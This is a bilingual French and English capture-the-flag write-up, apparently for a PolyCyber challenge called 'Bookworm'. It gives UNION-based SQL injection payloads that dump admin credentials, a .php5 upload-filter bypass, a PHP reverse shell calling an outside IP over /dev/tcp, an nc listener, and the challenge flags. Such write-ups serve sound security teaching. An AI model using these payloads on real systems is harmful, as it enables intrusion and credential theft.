# Bookworm

## Write-up FR

## Première partie du défi

### Étape 1 : Découverte de l'injection SQL

Lorsque vous accédez au site de recherche de livres, vous remarquez une vulnérabilité d'injection SQL dans le champ de recherche. Cela signifie que vous pouvez potentiellement interagir avec la base de données sous-jacente.

#### Base de données
Pour commencer, vous voulez obtenir les noms de toutes les bases de données disponibles. Vous pouvez utiliser la commande suivante dans le champ de recherche :

`-1' UniOn Select 1, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata-- -`

*Cela récupérera les noms de toutes les bases de données et les affichera sous forme de chaîne concaténée.*

#### Tables
Après avoir obtenu les noms des bases de données, vous pouvez choisir une base de données spécifique (par exemple, "library") et récupérer les noms de toutes les tables dans cette base de données :

`-1' UniOn Select 1, GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema="library"-- -`

*Cela récupérera les noms de toutes les tables dans la base de données "library".
*
#### Colonnes
Maintenant que vous avez les noms de tables, vous pouvez sélectionner une table spécifique (par exemple, "Admin") et récupérer les noms de toutes les colonnes dans cette table :

`-1' UniOn Select 1, GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name="Admin"-- -`

*Cela récupérera les noms de toutes les colonnes dans la table "Admin".*

#### Flag 1
Enfin, vous pouvez utiliser les noms de colonnes que vous avez obtenus pour extraire les données de la table "Admin" et ainsi obtenir le Flag 1. Voici la commande :

`-1' UNION SELECT 1, GROUP_CONCAT('Username: ', username, ' | Password: ', password) FROM Admin-- -`

*Cela récupérera les informations d'identification des utilisateurs stockées dans la table "Admin" sous forme de chaîne concaténée.*

**Flag 1 : polycyber{SQL_Br3ak0ut}**

## Deuxième partie du défi

### Étape 2 : Utilisation des informations d'identification

Maintenant que vous avez les informations d'identification de l'administrateur (Flag 1), vous pouvez vous connecter à la page "upload.php" en utilisant ces informations.

### Étape 3 : Contournement de la protection lors de l'upload

Lors de l'upload de fichiers sur la page "upload.php", vous essayez d'uploader un fichier PHP pour obtenir un reverse shell mais c'est bloqué. Pour contourner cette protection, vous allez utiliser une autre extension PHP, par exemple, ".php5".

Voici les étapes à suivre pour réussir :

1. Créez un fichier reverse shell PHP en utilisant un générateur en ligne comme https://www.revshells.com/. Entrez votre adresse IP et le port que vous souhaitez utiliser, recherchez un shell PHP approprié, copiez le contenu généré (utilisez le bouton "Copy" en bas à droite), enregistrez le fichier sous le format ".php5". Exemple de reverse shell:

```php
<?php
$cmd = 'bash -c \'(exec bash -i &>/dev/tcp/162.210.192.215/30979 0>&1) &\'';
system($cmd);
?>
```

2. Uploadez le fichier shell ".php5" sur le site du challenge. Le téléchargement réussira car il contient une extension autorisée.

3. Une fois le fichier téléchargé, vous recevrez un lien avec un nom de fichier aléatoire (/uploads/nomdufichier.php5). Vous pouvez y accéder en tapant l'adresse http://urlduchallenge/uploads/nomdufichier.php5.

4. Pour établir une connexion inverse (reverse shell), ouvrez un terminal sur une machine avec un port exposé (possible d'utiliser une service en ligne comme https://www.thc.org/segfault/) et lancez un listener. La commande suivante peut parfois suffir: nc -lvnp 9001 (utilisez le port que vous avez spécifié pour votre reverse shell). Sur https://www.thc.org/segfault/, vous pouvez simplement lancer la commande `rshell`.

5. Visitez l'URL du fichier ".php5" sur le navigateur (http://urlduchallenge/uploads/nomdufichier.php5) pour exécuter le reverse shell. Vous devriez recevoir une connexion inverse sur votre terminal.

### Étape 4 : Recherche du Flag 2

Maintenant que vous avez un accès shell sur la machine, explorez les répertoires et fichiers pour trouver le Flag 2. Vous le trouverez dans le dossier /var/www/flag.txt.

#### Flag 2
Le Flag 2 est situé dans le fichier /var/www/flag.txt. Vous pouvez l'afficher avec la commande appropriée depuis le shell (`cat flag.txt`).

Félicitations, vous avez réussi à trouver le Flag 2 !

**Flag 2 : polycyber{UPL04D_BYP4SS_SUCC3SS}**


## Write-up EN

## Part 1 of the Challenge

### Step 1: SQL Injection Discovery

When you access the book search website, you notice a SQL injection vulnerability in the search field. This means you can potentially interact with the underlying database.

#### Database
To start, you want to get the names of all available databases. You can use the following command in the search field:

`-1' UniOn Select 1, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata-- -`

*This will retrieve the names of all databases and display them as a concatenated string.*

#### Tables
After obtaining the names of databases, you can select a specific database (e.g., "library") and retrieve the names of all tables in that database:

`-1' UniOn Select 1, GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema="library"-- -`

*This will retrieve the names of all tables in the "library" database.*

#### Columns
Now that you have table names, you can select a specific table (e.g., "Admin") and retrieve the names of all columns in that table:

`-1' UniOn Select 1, GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name="Admin"-- -`

*This will retrieve the names of all columns in the "Admin" table.*

#### Flag 1
Finally, you can use the column names you obtained to extract data from the "Admin" table and obtain Flag 1. Here's the command:

`-1' UNION SELECT 1, GROUP_CONCAT('Username: ', username, ' | Password: ', password) FROM Admin-- -`

*This will retrieve user credentials stored in the "Admin" table as a concatenated string.*

**Flag: polycyber{SQL_Br3ak0ut}**

## Part 2 of the Challenge

### Step 2: Using the Credentials

Now that you have the administrator's credentials (Flag 1), you can log in to the "upload.php" page using these credentials.

### Step 3: Bypassing the Upload Protection

During file uploads on the "upload.php" page, you attempt to upload a PHP file to get a reverse shell, but it's blocked. To bypass this protection, you will use a different PHP extension, for example, ".php5".

Here are the steps to succeed:

1. Create a PHP reverse shell file using an online generator like https://www.revshells.com/. Enter your IP address and the port you want to use, search for a suitable PHP shell, copy the generated content (use the "Copy" button at the bottom right), save the file as ".php5". Example of reverse shell:

```php
<?php
$cmd = 'bash -c \'(exec bash -i &>/dev/tcp/162.210.192.215/30979 0>&1) &\'';
system($cmd);
?>
```

2. Upload the ".php5" shell file to the challenge website. The upload will succeed because it has an allowed extension.

3. Once the file is uploaded, you will receive a link with a random file name (/uploads/filename.php5). You can access it by typing the URL http://challengeurl/uploads/filename.php5.

4. To establish a reverse shell connection, open a terminal on a machine with an exposed port (you can use an online service like https://www.thc.org/segfault/) and start a listener. The following command may sometimes suffice: nc -lvnp 9001 (use the port you specified for your reverse shell). On https://www.thc.org/segfault/, you can simply execute the command rshell.

5. Visit the URL of the ".php5" file in your browser (http://challengeurl/uploads/filename.php5) to execute the reverse shell. You should receive a reverse connection on your terminal.

### Step 4: Finding Flag 2

Now that you have shell access to the machine, explore directories and files to find Flag 2. You will find it in the /var/www/flag.txt directory.

#### Flag 2
Flag 2 is located in the file /var/www/flag.txt. You can view it with the appropriate command from the shell (`cat flag.txt`).

Congratulations, you have successfully found Flag 2!

**Flag 2: polycyber{UPL04D_BYP4SS_SUCC3SS}**
